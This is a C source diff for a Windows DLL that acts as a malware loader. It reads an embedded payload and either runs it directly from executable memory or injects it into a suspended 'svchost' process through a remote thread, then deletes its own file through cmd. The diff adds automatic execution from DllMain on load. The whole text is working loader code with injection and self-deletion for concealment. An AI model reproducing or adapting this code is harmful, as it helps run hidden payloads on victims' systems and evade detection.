@@ -66,20 +66,27 @@ int main() {
     raw = readResource(&rawSize);
   }
 
-  STARTUPINFO si = {0};
-  PROCESS_INFORMATION pi = {0};
-  CreateProcess(0, "svchost", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
+  if (1) {
+    void *ptr = VirtualAlloc(0, rawSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(ptr, raw, rawSize);
+    free(raw);
+    ((void (*)())ptr)();
+  } else {
+    STARTUPINFO si = {0};
+    PROCESS_INFORMATION pi = {0};
+    CreateProcess(0, "svchost", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
 
-  void *ptr = VirtualAllocEx(pi.hProcess, 0, rawSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-  WriteProcessMemory(pi.hProcess, ptr, raw, rawSize, 0);
-  CreateRemoteThread(pi.hProcess, 0, 0, ptr, 0, 0, 0);
+    void *ptr = VirtualAllocEx(pi.hProcess, 0, rawSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(pi.hProcess, ptr, raw, rawSize, 0);
+    CreateRemoteThread(pi.hProcess, 0, 0, ptr, 0, 0, 0);
 
-  free(raw);
+    free(raw);
 
-  char args[MAX_PATH], path[MAX_PATH];
-  GetModuleFileName(DllHinst, path, MAX_PATH);
-  sprintf(args, "/c del \"%s\"", path);
-  spawnlp(P_OVERLAY, "cmd", args, NULL);
+    char args[MAX_PATH], path[MAX_PATH];
+    GetModuleFileName(DllHinst, path, MAX_PATH);
+    sprintf(args, "/c del \"%s\"", path);
+    spawnlp(P_OVERLAY, "cmd", args, NULL);
+  }
 
   return 0;
 }
@@ -89,10 +96,16 @@ int msg() {
   return 0;
 }
 
+DWORD WINAPI MyThreadFunction(LPVOID lpParam) {
+  return main();
+}
+
 BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
   switch (reason) {
   case DLL_PROCESS_ATTACH:
     DllHinst = hinst;
+    HANDLE threadHandle = CreateThread(0, 0, MyThreadFunction, 0, 0, 0);
+    CloseHandle(threadHandle);
     break;
   case DLL_THREAD_ATTACH:
   case DLL_THREAD_DETACH:
